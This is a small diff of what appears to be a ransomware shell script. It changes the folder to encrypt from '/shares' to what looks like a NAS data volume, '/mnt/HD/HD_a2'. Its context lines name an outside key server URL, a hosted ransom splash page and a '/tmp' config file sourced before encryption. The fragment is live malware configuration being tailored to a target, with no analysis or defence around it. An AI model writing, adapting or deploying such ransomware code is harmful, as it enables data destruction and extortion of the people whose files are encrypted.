@@ -7,7 +7,7 @@ keyServer="https://secure.www-ssl.co"
 splashLocation="https://raw.githubusercontent.com/absane/Tricks/master/ransom/ransomware_splash.html"
 
 # Folder to encrypt
-targetFolder="/shares"
+targetFolder="/mnt/HD/HD_a2"
 
 #	Encrypt files
 . /tmp/dynamicconfig.ini
